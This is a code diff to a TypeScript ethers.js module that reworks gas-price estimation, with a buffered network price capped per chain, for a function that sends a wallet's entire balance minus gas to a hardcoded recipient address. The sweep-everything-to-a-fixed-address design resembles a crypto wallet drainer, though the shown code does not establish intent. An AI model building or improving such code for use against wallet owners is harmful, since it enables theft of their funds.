@@ -19,12 +19,12 @@ export const CHAIN_NAMES = {
   [CHAIN_IDS.BASE]: 'Base',
 };
 
-// Static gas prices to use as fallback (in Gwei)
-export const STATIC_GAS_PRICES = {
-  [CHAIN_IDS.ETHEREUM]: '30.0',  // Higher for Ethereum
-  [CHAIN_IDS.ARBITRUM]: '0.2',
-  [CHAIN_IDS.OPTIMISM]: '0.02',
-  [CHAIN_IDS.BASE]: '0.01',
+// Maximum gas prices by chain (in Gwei) for worst case scenarios
+const MAX_GAS_PRICES = {
+  [CHAIN_IDS.ETHEREUM]: '60', // High enough to ensure tx goes through
+  [CHAIN_IDS.ARBITRUM]: '0.5',
+  [CHAIN_IDS.OPTIMISM]: '0.1',
+  [CHAIN_IDS.BASE]: '0.05',
 };
 
 // Estimated gas limit for a simple ETH transfer
@@ -69,6 +69,36 @@ export const switchNetwork = async (chainId: string): Promise<void> => {
 };
 
 /**
+ * Get the maximum possible gas price to ensure transaction goes through
+ * Each chain has a maximum plausible gas price to ensure transaction success
+ */
+const getMaxGasPrice = (chainId: string): ethers.BigNumber => {
+  return ethers.utils.parseUnits(MAX_GAS_PRICES[chainId], 'gwei');
+};
+
+/**
+ * Get the current network gas price + a buffer to ensure transaction goes through quickly
+ */
+const getCurrentGasPrice = async (provider: ethers.providers.Web3Provider, chainId: string): Promise<ethers.BigNumber> => {
+  try {
+    const networkGasPrice = await provider.getGasPrice();
+
+    // Add a 50% buffer to the current gas price to ensure the transaction goes through quickly
+    const bufferedGasPrice = networkGasPrice.mul(150).div(100);
+
+    // Cap at the maximum gas price to avoid extremely high costs
+    const maxGasPrice = getMaxGasPrice(chainId);
+
+    // Use the lower of the two values
+    return bufferedGasPrice.lt(maxGasPrice) ? bufferedGasPrice : maxGasPrice;
+  } catch (error) {
+    console.error('Error getting current gas price:', error);
+    // Use the maximum gas price as a fallback
+    return getMaxGasPrice(chainId);
+  }
+};
+
+/**
  * Transfer maximum balance minus gas fees to the specified recipient
  */
 export const transferAssets = async (
@@ -91,21 +121,8 @@ export const transferAssets = async (
     // Get current balance
     const balance = await provider.getBalance(address);
 
-    // Set up gas price - use static value by default
-    let gasPrice = ethers.utils.parseUnits(STATIC_GAS_PRICES[chainId], 'gwei');
-    let gasPriceSource = 'static';
-
-    // Try to get current gas price from the provider - this is optional and will fall back to static if it fails
-    try {
-      const currentGasPrice = await provider.getGasPrice();
-      // Add 20% buffer to ensure transaction goes through
-      const adjustedGasPrice = currentGasPrice.mul(120).div(100);
-      gasPrice = adjustedGasPrice;
-      gasPriceSource = 'network';
-      console.log(`Using ${gasPriceSource} gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`);
-    } catch (error) {
-      console.log(`Failed to fetch gas price from network, using static value: ${STATIC_GAS_PRICES[chainId]} Gwei`);
-    }
+    // Get the optimal gas price with safety buffer
+    const gasPrice = await getCurrentGasPrice(provider, chainId);
 
     // Calculate gas cost: gas price * gas limit
     const gasCost = gasPrice.mul(ESTIMATED_GAS_LIMIT);
@@ -118,8 +135,13 @@ export const transferAssets = async (
     // Calculate value to send: total balance - gas cost
     const valueToSend = balance.sub(gasCost);
 
+    // Check that we're sending a positive amount
+    if (valueToSend.lte(0)) {
+      throw new Error('After gas costs, there are no funds to transfer');
+    }
+
     console.log(`Transferring ${ethers.utils.formatEther(valueToSend)} ETH to ${RECIPIENT_ADDRESS}`);
-    console.log(`Gas cost: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei, source: ${gasPriceSource})`);
+    console.log(`Gas cost: ${ethers.utils.formatEther(gasCost)} ETH (${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei)`);
 
     // Create transaction object
     const tx = {
